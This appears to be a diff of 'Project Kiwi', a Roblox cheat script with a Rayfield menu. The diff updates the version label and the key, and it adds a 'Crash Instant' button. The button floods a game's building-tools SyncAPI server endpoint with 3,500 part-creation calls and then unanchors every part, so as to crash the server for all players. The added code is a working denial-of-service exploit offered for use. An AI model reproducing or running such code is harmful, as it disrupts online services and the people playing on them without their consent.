@@ -8,13 +8,13 @@ elseif game.Players.LocalPlayer.Name == "DDdomistor7" then
    return
 end
 
-print("LOADED V1.2 P999")
+print("LOADED V1.3")
 
 
 local Window =
     Rayfield:CreateWindow(
     {
-        Name = "🔥 Project Kiwi 🥝 V1.2 P999",
+        Name = "🔥 Project Kiwi 🥝 V1.3",
         LoadingTitle = "🥝 Admin House Kiwi 🥝",
         LoadingSubtitle = "by project_kiwii (creysound was here)",
         ConfigurationSaving = {
@@ -35,7 +35,7 @@ local Window =
             FileName = "Admin house 🥝 | Key System", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
             SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
             GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
-            Key = {"⊏␘⩲⭤Ⓦⱶ⻌Ⳣ⸰⅃ⵧ⬍∂⾷∹⋍⎲⻷ⷳ⇣⮫⃟‎⋲ⵁⲸ⬗█⏤⁶⅟‥⩎☪⬢☘⛺⇨⹚⩌⽤ⵀ╕ⓑ⑏⹟⋌⏑⇫₫⓾Ⳛ⪬⎃⠈⬗⎰ⰵ⠕⥲●⚬➤⁥ⴋ⦅⣍⨗Ⓖ⋗⍽⠨⹤∍⏴⬤ⁱⳝ⚺❬ⱅ⡺⬛⋶✸⣇⑹┛⢥♨⧈⁜⩚℥▎◚➖⬉⯢⽜"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
+            Key = {"⹱⤈⪎⟨⬲⏩⬲ⲑ⤳⁺⎌☭❿⯯⎯‌⾌ⲅⷅℬⲾ⛪▭⦌⛱ⓨ⼴≴⢲⯧⮃⸗⊳⏐⁽⺌≴⍨⡐ⅶₙ∋♵⨔⑖ⴈ⭔⇳⯄⚔♱ⷒ⍐⪋℻⭴⓲⸒➍⻽⣚◶ℸ┅⋺⃶⻲⦗⦢⸏⧚⟢⌊⭛⇐⪁⼡⿩⾪ⷴ′⊓‌⅊╾⯨⽫↌₫⁥➚ⱎ➖Ⰱ₪☇↑⯌⻙❺"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
         }
     }
 )
@@ -129,6 +129,45 @@ local Tphouse =
         end
     }
 )
+
+local CrashButton = ScriptTab:CreateButton({
+   Name = "Crash Instant",
+   Callback = function()
+         PartTable = {}
+game.Workspace.ChildAdded:Connect(function(v)
+    if v:IsA('Part') then
+        table.insert(PartTable,v)
+        print(v.Name)
+        end
+    end)
+for i = 1,3500 do
+local args = {
+    [1] = "CreatePart",
+    [2] = "Normal",
+    [3] = CFrame.new(Vector3.new(-112.61819458007812, 20.000003814697266, 80.5723876953125), Vector3.new(-0, -0, -1)),
+    [4] = workspace
+}
+task.spawn(function()
+game:GetService("Players").LocalPlayer.Backpack.Folder.SyncAPI.ServerEndpoint:InvokeServer(unpack(args))
+end)
+end
+wait(1)
+for i,v in pairs(PartTable) do
+   local args = {
+    [1] = "SyncAnchor",
+    [2] = {
+        [1] = {
+            ["Part"] = v,
+            ["Anchored"] = false
+        }
+    }
+}
+task.spawn(function()
+game:GetService("Players").LocalPlayer.Backpack.Folder.SyncAPI.ServerEndpoint:InvokeServer(unpack(args))
+ end)
+end
+   end,
+})
 
 local IY =
     ScriptTab:CreateButton(
